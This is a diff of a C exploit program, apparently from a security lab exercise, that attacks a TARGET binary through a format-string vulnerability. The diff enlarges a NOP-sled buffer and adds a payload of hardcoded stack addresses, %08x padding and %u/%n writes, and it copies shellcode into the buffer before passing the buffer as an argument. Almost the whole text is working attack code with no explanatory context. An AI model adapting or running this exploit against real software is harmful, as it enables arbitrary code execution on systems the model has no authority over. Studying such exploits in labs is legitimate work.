@@ -11,20 +11,25 @@ int main(void)
   int i;
   char *args[3];
   char *env[1];
-  char buf[50];
-  memset(buf, 0x90, 50);
+  char buf[400];
+  memset(buf, 0x90, 400);
 
   //strncpy(buf, "\x50\xfb\xff\xbf%08x%08x%08x%n", 18); 
-  strncpy(buf, "\x3c\xfe\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
+  //strncpy(buf, "\x3c\xf3\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
+  //strncpy(buf, "%16u%n%16u%n%32u%n%64u%n1\x3c\xf3\xff\xbf1\x3d\xfe\xff\xbf1\x3e\xfe\xff\xbf1\x3f\xfe\xff\xbf", 44);
+
+  strncpy(buf, "%08x%08x%08x\x3c\xfe\xff\xbf\x01\x01\x01\x01\x3d\xfe\xff\xbf\x01\x01\x01\x01\x3e\xfe\xff\xbf\x01\x01\x01\x01"
+      "\x3f\xfe\xff\xbf%u%n%u%n%u%n%u%n", 49); 
+
+
+  //strncpy(buf, "\x3c\xfe\xff\xbf\x3d\xfe\xff\xbf\x3e\xfe\xff\xbf\x3f\xfe\xff\xbf%08x%08x%08x%n%n%n%n", 36);
+  strncpy(buf+353, shellcode, 45);
+  
   //for(i = 0; i < 113; i++) {
     //strncpy(buf+4+(i*4), "%08x", 4); 
   //}
   
   //strncpy(buf+305, "%n", 2);
-  
-  //strncpy(buf+240, "\x70", 1);
-  //strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
-  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
   
   args[0] = TARGET; 
   args[1] = buf;
